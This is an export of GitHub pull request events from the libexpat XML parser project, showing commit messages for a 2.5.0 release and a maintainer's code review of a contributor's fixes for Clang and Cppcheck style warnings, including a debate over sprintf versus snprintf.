666,Revise,2022-10-24 14:00:15,hartwork,unfork_merge,examples: Make passing of depth pointer consistent across examples,"{""sha"": ""fcb91e43bd4fe0ef21f1797f94b6ea02d03fcab9"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-23T23:35:06Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T14:00:15Z""}}"
666,Revise,2022-10-24 14:00:43,hartwork,unfork_merge,examples/outline.c: Make use of BUFSIZ from stdio.h consistent across examples,"{""sha"": ""93a757ab7dfde74327da6316fbaddde13f56ae77"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-23T23:36:26Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T14:00:43Z""}}"
666,Revise,2022-10-24 14:00:45,hartwork,unfork_merge,examples/elements.c: Resolve unused include of <wchar.h>,"{""sha"": ""2f38031778d6512f3e6b684492b4d0cc3428baef"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T00:10:03Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T14:00:45Z""}}"
666,Revise,2022-10-24 14:00:45,hartwork,unfork_merge,examples: Be consistent across examples regarding read looping and main exit,"{""sha"": ""894b98d9b39a5ffa26caaff4cc9444c14642cb87"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-23T23:40:33Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T14:00:45Z""}}"
666,Revise,2022-10-24 14:00:45,hartwork,unfork_merge,examples/elements.c: Be consistent across examples regarding OOM detection,"{""sha"": ""77409cde885f54d9a8be4a18ec5b88c0935cc8bb"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T00:04:45Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T14:00:45Z""}}"
666,Revise,2022-10-24 14:00:45,hartwork,unfork_merge,examples/outline.c: Be consistent in main loop exit across examples,"{""sha"": ""2b3b95c670a58ce9f79b42772261f10ddb1c5430"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-23T23:50:03Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T14:00:45Z""}}"
666,Revise,2022-10-24 14:00:45,hartwork,unfork_merge,examples/outline.c: Make element handler signatures consistent across examples,"{""sha"": ""023b95dba00117cd1fed2d8a97ce80331376a1f9"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-23T23:45:47Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T14:00:45Z""}}"
666,Revise,2022-10-24 14:00:45,hartwork,unfork_merge,examples/elements.c: Be consistent in parse error reporting format across examples,"{""sha"": ""37386fd2d3fa798f3c5bd94366f3efe66e31dec5"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-23T23:53:06Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T14:00:45Z""}}"
666,Revise,2022-10-24 14:01:19,hartwork,unfork_merge,examples: Make use of XML_GetBuffer,"{""sha"": ""dbf1202529f7a531e65c43f0db2324520a85d10a"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T00:20:04Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T14:01:19Z""}}"
666,Revise,2022-10-24 14:01:20,hartwork,unfork_merge,examples: Add some whitespace for readability,"{""sha"": ""9294082e74b4845191ccc695cdf16eb53a0d3f9d"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T00:26:10Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T14:01:20Z""}}"
666,Revise,2022-10-24 14:01:20,hartwork,unfork_merge,cmake: Resolve duplication related to building examples,"{""sha"": ""a608db28836e18c809cc4a3afc1ba8fa38872d29"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T00:33:34Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T14:01:20Z""}}"
666,Revise,2022-10-24 14:01:20,hartwork,unfork_merge,Changes: Document #666,"{""sha"": ""55ca00111253d8735ea78fbec63431403cbb6cb6"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T13:18:12Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T14:01:20Z""}}"
666,HeadRefForcePushed,2022-10-24 14:02:40,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7654332461"", ""commit_url"": null}"
666,MergePR,2022-10-24 16:32:56,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7655684447"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/18439d4f8b7452d6ce031eaad23969ca799ad088""}"
666,DeleteBranch,2022-10-24 17:50:08,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7656236822"", ""commit_url"": null}"
668,SubmitCommit,2022-10-24 16:32:42,hartwork,unfork_merge,Sync file headers,"{""sha"": ""7e27f561a6b01f02413b9e288eaba04c218b58a5"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T14:49:13Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T16:32:42Z""}}"
668,SubmitCommit,2022-10-24 16:32:42,hartwork,unfork_merge,"Bump version info from 9:9:8 to 9:10:8

See https://verbump.de/ for what these numbers do","{""sha"": ""db20f72472b846a2892277392986f36253ab974f"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T14:57:04Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T16:32:42Z""}}"
668,SubmitCommit,2022-10-24 16:32:42,hartwork,unfork_merge,Bump version to 2.5.0,"{""sha"": ""454c6105bc2d0ea2521b8f8f7a5161c2abd8c386"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T14:57:42Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T16:32:42Z""}}"
668,SubmitCommit,2022-10-24 16:32:42,hartwork,unfork_merge,Changes: Document #656 #658,"{""sha"": ""82a9c09f6c1215af22ed5b86b558ffc226772a93"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T15:06:08Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T16:32:42Z""}}"
668,SubmitCommit,2022-10-24 16:32:42,hartwork,unfork_merge,Set release date for version 2.5.0,"{""sha"": ""acbbef94204b280b2d3492e6daa9fd19e51d6cac"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T15:09:36Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T16:32:42Z""}}"
668,Labeled,2022-10-24 16:37:25,hartwork,unfork_merge,releasing,
668,OpenPR,2022-10-24 16:37:25,hartwork,unfork_merge,,
668,Labeled,2022-10-24 16:39:14,hartwork,unfork_merge,security,
668,Revise,2022-10-25 13:21:40,hartwork,unfork_merge,Changes: Add note on impact of CVE-2022-43680,"{""sha"": ""fe8ff0345f889b322215739a3fa7b6ca8a8a6bbe"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-25T13:21:40Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-25T13:21:40Z""}}"
668,MergePR,2022-10-25 15:08:13,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7664565694"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/654d2de0da85662fcc7644a7acd7c2dd2cfb21f0""}"
668,DeleteBranch,2022-10-25 15:09:42,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7664579705"", ""commit_url"": null}"
669,SubmitCommit,2022-10-25 13:03:12,seanm,fork_merge,"Fixed all clang -Wconditional-uninitialized warnings

Just initialized to zero to shut the compiler up.","{""sha"": ""2ee10be8c8fbe5863ed424113527caf4572e0b81"", ""author"": {""name"": ""Sean McBride"", ""email"": ""sean@rogue-research.com"", ""date"": ""2022-10-22T00:43:34Z""}, ""committer"": {""name"": ""Sean McBride"", ""email"": ""sean@rogue-research.com"", ""date"": ""2022-10-25T13:03:12Z""}}"
669,SubmitCommit,2022-10-25 13:06:44,seanm,fork_merge,"Fixed most clang -Wreserved-id-macro warnings

Renamed to not start with underscore + uppercase, which is reserved.","{""sha"": ""0212538640b36e18cbb197ec4719896c68f7008b"", ""author"": {""name"": ""Sean McBride"", ""email"": ""sean@rogue-research.com"", ""date"": ""2022-10-22T00:45:43Z""}, ""committer"": {""name"": ""Sean McBride"", ""email"": ""sean@rogue-research.com"", ""date"": ""2022-10-25T13:06:44Z""}}"
669,OpenPR,2022-10-25 13:14:19,seanm,fork_merge,,
669,HeadRefForcePushed,2022-10-25 14:56:14,seanm,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7664451143"", ""commit_url"": null}"
669,HeadRefForcePushed,2022-10-25 17:12:44,seanm,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7665633583"", ""commit_url"": null}"
669,ReviewRejected,2022-10-26 16:13:20,hartwork,fork_merge,"Hi @seanm,


I have reviewed all but the `-Wcast-qual` fixes now, please see below for my findings.

Given the volume of both fixed (and unfixed) warnings regarding `-Wcast-qual` I'm considering to suggest dropping or extracting the two related commits because of the unhealthy value-per-time aspect of those changes. It would allow us to finish and merge the rest of the pull request quicker.

Other than `-Wcast-qual`, here is what I found during review:

- Commit `Fixed all clang -Wconditional-uninitialized warnings`
  - No concerns or objections.
- Commit `Fixed most clang -Wreserved-id-macro warnings`
  - It's apparently all not just most; if true please adjust the commit message
  - No other concerns or objections.
- Commit `Fixed all clang -Wunused-macros warnings`
  - `poolEnd` — confirmed unused
  - `SET2` — confirmed unused since commit 583f937102f5f95e41dbd0e6f4ffb9d3323db3aa.
    Found using `git log -p | grep -E 'SET2|^commit ' | grep -B1 SET2`
  - `XML_FMT_CHAR` — confirmed unused
  - :warning:  `DUMMY_DEFAULT_HANDLER_FLAG` — technically unused, may need a line `dummy_handler_flags |= DUMMY_DEFAULT_HANDLER_FLAG` at the end of function `dummy_default_handler`.  Three more functions need a closer look (or a maybe comment) for the same thing:

    - `dummy_xdecl_handler`
    - `dummy_end_element`
    - `dummy_cdata_handler`

    CC @RMJ10 
- Commit `Fixed all clang -Wunreachable-code warnings`
  - :warning: Those `0 && ` were added on purpose (see 5841ab111b4cd0528aadc4e9c93d675fde39aa3f) so that the disabled code is still compiled. So that's a feature so this commit should be dropped to not make things worse while we still have that code.
- Commit `Fixed some clang -Wcast-qual warnings`
  - TODO/ignored as mentioned above
- Commit `Fixed a clang -Wcast-qual warning with strtoul() usage`
  - TODO/ignored as mentioned above
- Commit `Fixed cppcheck warnings`:
  - My local Cppcheck 2.9 does not produces these warnings.  Please elaborate on which version of Cppcheck you are using and how you are invoking the tool so I can see these warnings myself.  Thank you!
  - :warning: There is an unrelated change from `sprintf` to `snprintf` in this commit.  Please get the unrelated change out of this commit (e.g using `git rebase -i`). Thank you!
  - (Let me do more research on this:) My vote against pulling `int i = 0` into the for loop header.  Let's do `int i = 0` right before the `for` loop and keep the first `for` header segment empty a la `for (; update; check)`. What do you think?
- Commit `Replaced all sprintf with safer snprintf`
  - I have a phantom memory that use of `snprintf` causes portability issues due to difference in prototype across platforms.  I cannot find or confirm right now, but I will need to check again.
- Commit `Fixed a clang -Wreserved-id-macro warnings by conditionalizing to linux-only`
  - :warning: To my understanding `_GNU_SOURCE` is about glibc and not about Linux and limiting the scope is not a proper fix to the warning in my eyes. Please drop this commit. If we want to improve on it, we can, but it deserves a dedicated issue and/or pull request then.

Best, Sebastian","{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/669#pullrequestreview-1156875632""}"
669,IssueComment,2022-10-26 16:30:42,hartwork,fork_merge,"PS: @seanm what I found regarding `snprintf`:
- https://www.gnu.org/software/autoconf/manual/autoconf-2.69/html_node/Function-Portability.html — can probably be ignored
- The notes on `Feature Test Macro Requirements for glib` regarding `snprintf` (but not plain `sprintf`) in `man 3 snprintf` — can probably *not* be ignored and will likely need additional changes, given empty `git grep -E '_XOPEN_SOURCE|_ISOC99_SOURCE|_BSD_SOURCE'`
","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1292306634"", ""author_association"": ""MEMBER""}"
669,IssueComment,2022-10-26 16:48:03,seanm,fork_merge,"OK, thanks for your comprehensive review and comments... gimme a couple of hours and I'll have a reply and new commits pushed...","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1292326325"", ""author_association"": ""CONTRIBUTOR""}"
669,IssueComment,2022-10-26 16:57:11,hartwork,fork_merge,"@seanm three more notes on `snprintf`.

First, while `snprintf`'s return value may not be too relevant to our case in Expat, `snprintf` returning 5 here (on Linux) scares me:

```console

# gcc -std=c99 -Wextra -pedantic main.c && ./a.out
snprintf returned: 5 !!!
[0] 0x68
[1] 0x65
[2] 0x00

# cat main.c 
#include <assert.h>
#include <stdio.h>

int main() {
    char buf[3];
    const int bytesWritten = snprintf(buf, sizeof(buf), ""hello"");
    printf(""snprintf returned: %d !!!\n"", bytesWritten);
    assert(bytesWritten >= 0);
    int i = 0;
    for (; i < (int)sizeof(buf); i++) {
        printf(""[%d] 0x%02x\n"", i, buf[i]);
    }
    return 0;
}
```

And this part of the MSDN docs at https://learn.microsoft.com/en-us/previous-versions/visualstudio/visual-studio-2012/2ts7cx93(v=vs.110)?redirectedfrom=MSDN seems worth noting, emphasis mine:

> If len = count, then len characters are stored in buffer, **no null-terminator is appended, and len is returned**.
> 
> If len > count, then count characters are stored in buffer, **no null-terminator is appended, and a negative value is returned**.

I cannot it conform it easily, but it doesn't exactly make `snprintf` a likely candidate for a friend of mine.

I'm tempted to say that the warning is the problem rather than the current code: because Expat's use of `snprintf` seems safe and sane and general use (and advertising) of `snprintf` by the compiler seems questionable to me, given the findings above.  Maybe that's why it's not included with `-Wextra`.


","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1292337052"", ""author_association"": ""MEMBER""}"
669,IssueComment,2022-10-26 17:17:57,hartwork,fork_merge,"@seanm update on the `for` loop variable declaration: I can now confirm that `for (int i = 3; i < 5; i++)` is legal in >=C99 but not earlier. Expat request >=C99 officially by now, so technically that code is an option to us, for better or worse. For proof:

```console
# gcc -std=c89 -Wextra -pedantic main.c && ./a.out
main.c: In function ‘main’:
main.c:4:5: error: ‘for’ loop initial declarations are only allowed in C99 or C11 mode
    4 |     for (int i = 3; i < 5; i++) {
      |     ^~~
main.c:4:5: note: use option ‘-std=c99’, ‘-std=gnu99’, ‘-std=c11’ or ‘-std=gnu11’ to compile your code

# cat main.c 
#include <stdio.h>

int main() {
    for (int i = 3; i < 5; i++) {
        printf(""i is %d\n"", i);
    }
    return 0;
}
```

Related links that I consider an interesting read:
- [What are the C++ scoping rules for for loops?](https://www.cs.technion.ac.il/users/yechiel/c++-faq/scope-of-for-loop-var.html)
- [Moving the kernel to modern C](https://lwn.net/Articles/885941/)","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1292361623"", ""author_association"": ""MEMBER""}"
669,IssueComment,2022-10-26 17:23:28,seanm,fork_merge,">Commit Fixed most clang -Wreserved-id-macro warnings
>It's apparently all not just most; if true please adjust the commit message

In fact it is just most, because it doesn't fix `_GNU_SOURCE`, which as you saw is in another commit because the fix for it is dubious I agree.

I've dropped `Fixed all clang -Wunreachable-code warnings` as requested.

I'll make a new PR for the `consts`.

> Please elaborate on which version of Cppcheck you are using and how you are invoking the tool so I can see these warnings myself

Version 2.9: `cppcheck --project=compile_commands.json --platform=unspecified --enable=style -q --library=qt --library=posix --library=gnu --library=bsd --library=windows --template='{id},{file}:{line},{severity},{message}' -j8`

>My vote against pulling int i = 0 into the for loop header. Let's do int i = 0 right before the for loop and keep the first for header segment empty a la for (; update; check). What do you think?

I disagree.  `for (int i = 0; i < count; i++)` is idiomatic and limits the scope of `i` to inside the loop.  Do you need to support pre-C99?  It a [common coding guideline](https://wiki.sei.cmu.edu/confluence/display/c/DCL19-C.+Minimize+the+scope+of+variables+and+functions).

>First, while snprintf's return value may not be too relevant to our case in Expat, snprintf returning 5 here (on Linux) scares me

It's documented to: ""return the number of characters that ***would have*** been printed if the size were unlimited"". This lets you know the buffer you supplied was not big enough.  Otherwise how would you know your string got truncated? Anyway, the return value both before and after my change was never even looked at.

>If len = count, then len characters are stored in buffer, no null-terminator is appended, and len is returned.

That's `_snprintf` (note the leading underscore). That's an older function from before MS supported the standard `snprintf`.  The standard `snprintf` is never worse than the standard `sprintf`.  Except for the return value (which is often not used) the only difference if that `snprintf` will never overrun your buffer because you tell it how big the buffer is.  It also ***always*** null terminates, truncating if necessary.

>Commit Fixed a clang -Wreserved-id-macro warnings by conditionalizing to linux-only 

I'll create a ticket for this.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1292367613"", ""author_association"": ""CONTRIBUTOR""}"
669,HeadRefForcePushed,2022-10-26 17:24:39,seanm,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7674932473"", ""commit_url"": null}"
669,IssueComment,2022-10-26 17:42:00,seanm,fork_merge,"For `_GNU_SOURCE`, I'm thinking maybe:

```
#if defined(HAVE_SYSCALL_GETRANDOM)
#  define _GNU_SOURCE 1 /* syscall prototype */
#endif
```

Since it's being defined only for `syscall()`.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1292389385"", ""author_association"": ""CONTRIBUTOR""}"
669,IssueComment,2022-10-26 18:02:06,hartwork,fork_merge,"> For `_GNU_SOURCE`, I'm thinking maybe:
> 
> ```
> #if defined(HAVE_SYSCALL_GETRANDOM)
> #  define _GNU_SOURCE 1 /* syscall prototype */
> #endif
> ```
> 
> Since it's being defined only for `syscall()`.

@seanm we *can* add that, provided we keep the already-defined guard in place. I'd wonder though what practical issue we'd fix by that. We would not fully fix the warning, except maybe for where `HAVE_SYSCALL_GETRANDOM` is not defined. Id say we either fit it for all platforms or none.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1292409118"", ""author_association"": ""MEMBER""}"
669,IssueComment,2022-10-26 18:24:09,hartwork,fork_merge,"> > Commit Fixed most clang -Wreserved-id-macro warnings
> > It's apparently all not just most; if true please adjust the commit message
> 
> In fact it is just most, because it doesn't fix `_GNU_SOURCE`, which as you saw is in another commit because the fix for it is dubious I agree.

@seanm understood, you're right.

> I've dropped `Fixed all clang -Wunreachable-code warnings` as requested.

Thanks!

> I'll make a new PR for the `consts`.

Thanks!


> > Please elaborate on which version of Cppcheck you are using and how you are invoking the tool so I can see these warnings myself
> 
> Version 2.9: `cppcheck --project=compile_commands.json --platform=unspecified --enable=style -q --library=qt --library=posix --library=gnu --library=bsd --library=windows --template='{id},{file}:{line},{severity},{message}' -j8`

Seems like it's `--enable=style` that enabled those. We can include those that you already have, but let's refrain from puilling in more like theses because the value these fixes bring doesn't make up for the time you and me will have put in by the end of it.

> > My vote against pulling int i = 0 into the for loop header. Let's do int i = 0 right before the for loop and keep the first for header segment empty a la for (; update; check). What do you think?
> 
> I disagree. `for (int i = 0; i < count; i++)` is idiomatic and limits the scope of `i` to inside the loop. Do you need to support pre-C99? It a [common coding guideline](https://wiki.sei.cmu.edu/confluence/display/c/DCL19-C.+Minimize+the+scope+of+variables+and+functions).

On the C99 part please see https://github.com/libexpat/libexpat/pull/669#issuecomment-1292361623 that I posted in the mean time. I hope that `-Wextra` would wake us up if we ever run into variable shadowing from that technique. Your call.

> > First, while snprintf's return value may not be too relevant to our case in Expat, snprintf returning 5 here (on Linux) scares me
> 
> It's documented to: ""return the number of characters that _**would have**_ been printed if the size were unlimited"". This lets you know the buffer you supplied was not big enough. Otherwise how would you know your string got truncated?

That's an interesting point. So unfortunate but necessary, I suppose. (Honestly, I still favor a proper check and use of `sprintf`. The code will be safe and explain itself.)

> Anyway, the return value both before and after my change was never even looked at.

Yes. (I'm acknowledging that at https://github.com/libexpat/libexpat/pull/669#issuecomment-1292337052 that I posted in the mean time.)

> > If len = count, then len characters are stored in buffer, no null-terminator is appended, and len is returned.
> 
> That's `_snprintf` (note the leading underscore). That's an older function from before MS supported the standard `snprintf`. The standard `snprintf` is never worse than the standard `sprintf`. Except for the return value (which is often not used) the only difference if that `snprintf` will never overrun your buffer because you tell it how big the buffer is. It also _**always**_ null terminates, truncating if necessary.

Interesting point, I think you're right. So https://learn.microsoft.com/en-us/previous-versions/2ts7cx93(v=vs.140) would have been a better link for me to share and study.

> > Commit Fixed a clang -Wreserved-id-macro warnings by conditionalizing to linux-only
> 
> I'll create a ticket for this.

Okay.
","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1292431772"", ""author_association"": ""MEMBER""}"
669,IssueComment,2022-10-26 18:34:16,hartwork,fork_merge,"@seanm regarding feature tests for `snprintf` I find…

> ```
>        snprintf(), vsnprintf():
>            _XOPEN_SOURCE >= 500 || _ISOC99_SOURCE
>                || /* Glibc <= 2.19: */ _BSD_SOURCE
> ```

…in `man 3 snprintf` and …

> Macro: _ISOC99_SOURCE
>
> If this macro is defined, features from ISO C99 are included. Since these features are included by default, this macro is mostly relevant when the compiler uses an earlier language version. 

at https://www.gnu.org/software/libc/manual/html_node/Feature-Test-Macros.html . I guess we don't need to enforce `_ISOC99_SOURCE` ourselves then. What do you think?
","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1292442128"", ""author_association"": ""MEMBER""}"
669,ReviewComment,2022-10-26 18:43:28,hartwork,fork_merge,,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/669#pullrequestreview-1157106287""}"
669,RenameTitle,2022-10-26 18:44:15,hartwork,fork_merge,,"{""rename"": {""from"": ""Misc warnings"", ""to"": ""Fix miscellaneous Clang and Cppcheck 2.9 warnings""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7675463181""}"
669,Labeled,2022-10-26 18:44:23,hartwork,fork_merge,enhancement,
669,Revise,2022-10-26 18:57:23,seanm,fork_merge,"Fixed most clang -Wunused-macros warnings

These are indeed dead code.","{""sha"": ""e3c91d07709b5c16c1b74a9641c1de96c1e7b1f3"", ""author"": {""name"": ""Sean McBride"", ""email"": ""sean@rogue-research.com"", ""date"": ""2022-10-22T00:47:22Z""}, ""committer"": {""name"": ""Sean McBride"", ""email"": ""sean@rogue-research.com"", ""date"": ""2022-10-26T18:57:23Z""}}"
669,Revise,2022-10-26 18:57:46,seanm,fork_merge,"Fixed cppcheck 2.9 warnings

The warnings were:

variableScope,expat/tests/chardata.c:83,style,The scope of the variable 'buffer' can be reduced.

constParameter,expat/tests/memcheck.c:85,style,Parameter 'ptr' can be declared as pointer to const

variableScope,expat/tests/structdata.c:106,style,The scope of the variable 'i' can be reduced.","{""sha"": ""ce15e2c21963b6f85bb34db0f414bc2b998a9b19"", ""author"": {""name"": ""Sean McBride"", ""email"": ""sean@rogue-research.com"", ""date"": ""2022-10-22T02:23:53Z""}, ""committer"": {""name"": ""Sean McBride"", ""email"": ""sean@rogue-research.com"", ""date"": ""2022-10-26T18:57:46Z""}}"
669,Revise,2022-10-26 18:57:47,seanm,fork_merge,"Replaced all sprintf with safer snprintf

Although they differ in return values, none of the calls look at the return value.","{""sha"": ""417f46b895edc5aafd57758ceaa59599b4c0efdd"", ""author"": {""name"": ""Sean McBride"", ""email"": ""sean@rogue-research.com"", ""date"": ""2022-10-24T15:31:19Z""}, ""committer"": {""name"": ""Sean McBride"", ""email"": ""sean@rogue-research.com"", ""date"": ""2022-10-26T18:57:47Z""}}"
669,Revise,2022-10-26 18:57:47,seanm,fork_merge,"Partly fixed a clang -Wreserved-id-macro warning with _GNU_SOURCE

_GNU_SOURCE is only defined for the syscall() function, so only define it if HAVE_SYSCALL_GETRANDOM is also defined.

This fixes the only remaining -Wreserved-id-macro, at least for many cases (like macOS, Windows, and BSD).","{""sha"": ""087e0327e863babefd4d480ec705a6d705e633f5"", ""author"": {""name"": ""Sean McBride"", ""email"": ""sean@rogue-research.com"", ""date"": ""2022-10-26T18:56:51Z""}, ""committer"": {""name"": ""Sean McBride"", ""email"": ""sean@rogue-research.com"", ""date"": ""2022-10-26T18:57:47Z""}}"
669,IssueComment,2022-10-26 19:33:28,seanm,fork_merge,">Seems like it's --enable=style that enabled those. We can include those that you already have, but let's refrain from puilling in more like theses

There are no more.  cppcheck gives no warnings after this PR.

>(Honestly, I still favor a proper check and use of sprintf. The code will be safe and explain itself.)

There is no such thing as safe use of `sprintf`. :)  It's just too easy to overrun a buffer.  `sprintf` should ***never*** be used.

>I guess we don't need to enforce _ISOC99_SOURCE ourselves then. What do you think?

I don't think you need `_ISOC99_SOURCE`.  C99 requires `snprintf`, you require C99. Done. :)

>we can add that, provided we keep the already-defined guard in place.

Done.  I've brought it back in this PR.

>I'd wonder though what practical issue we'd fix by that. We would not fully fix the warning, except maybe for where HAVE_SYSCALL_GETRANDOM is not defined.

Which is many places: macOS, Windows, BSD, etc.  That's valuable to me.  It means I have no more -Wreserved-id-macro warnings on macOS anymore.

>Id say we either fit it for all platforms or none.

It's impossible to fix for linux/glibc, since they require it to be defined.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1292544130"", ""author_association"": ""CONTRIBUTOR""}"
669,HeadRefForcePushed,2022-10-26 19:34:01,seanm,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7675860553"", ""commit_url"": null}"
669,IssueComment,2022-10-26 20:02:35,hartwork,fork_merge,"> > Seems like it's --enable=style that enabled those. We can include those that you already have, but let's refrain from puilling in more like theses
> 
> There are no more. cppcheck gives no warnings after this PR.

Cannot confirm. When I do `git ls-files \*.c \*.cpp \*.h | xargs cppcheck --enable=style` on this code I get more warnings e.g. including `The scope of the variable '...' can be reduced.` Maybe it's a different  in config, but let's not pull more of these in either way.

> > (Honestly, I still favor a proper check and use of sprintf. The code will be safe and explain itself.)
> 
> There is no such thing as safe use of `sprintf`. :) It's just too easy to overrun a buffer. `sprintf` should _**never**_ be used.

We don't agree on that then.

> > I guess we don't need to enforce _ISOC99_SOURCE ourselves then. What do you think?
> 
> I don't think you need `_ISOC99_SOURCE`. C99 requires `snprintf`, you require C99. Done. :)

Alright :smile: 

> > we can add that, provided we keep the already-defined guard in place.
> 
> Done. I've brought it back in this PR.
> 
> > I'd wonder though what practical issue we'd fix by that. We would not fully fix the warning, except maybe for where HAVE_SYSCALL_GETRANDOM is not defined.
> 
> Which is many places: macOS, Windows, BSD, etc. That's valuable to me. It means I have no more -Wreserved-id-macro warnings on macOS anymore.
> 
> > Id say we either fit it for all platforms or none.
> 
> It's impossible to fix for linux/glibc, since they require it to be defined.

I feel a bit like my argument has been ignored here. Fixing some warnings upstream is a good idea but compiling dependencies with the same warning level as your first party code is not something I consider useful, these two builds should be isolated. The only reason I'm not asking for a revert of that addition is because a correctness argument can be made that is hard to argue against. It is however by no means something worth calling a fix to the warning, it only hides the code from analysis.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1292591122"", ""author_association"": ""MEMBER""}"
669,ReviewApproved,2022-10-26 20:30:16,hartwork,fork_merge,,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/669#pullrequestreview-1157246843""}"
669,RenameTitle,2022-10-26 20:32:16,hartwork,fork_merge,,"{""rename"": {""from"": ""Fix miscellaneous Clang and Cppcheck 2.9 warnings"", ""to"": ""Fix miscellaneous Clang and Cppcheck 2.9 style warnings""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7676356979""}"
669,MergePR,2022-10-26 20:50:23,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7676514301"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/f85fff6e1197f5310cb413bd4be11779425d6965""}"
669,IssueCommentSupplement,2022-10-26 21:02:02,seanm,fork_merge,">Cannot confirm. When I do git ls-files \*.c \*.cpp \*.h | xargs cppcheck --enable=style on this code I get more warnings

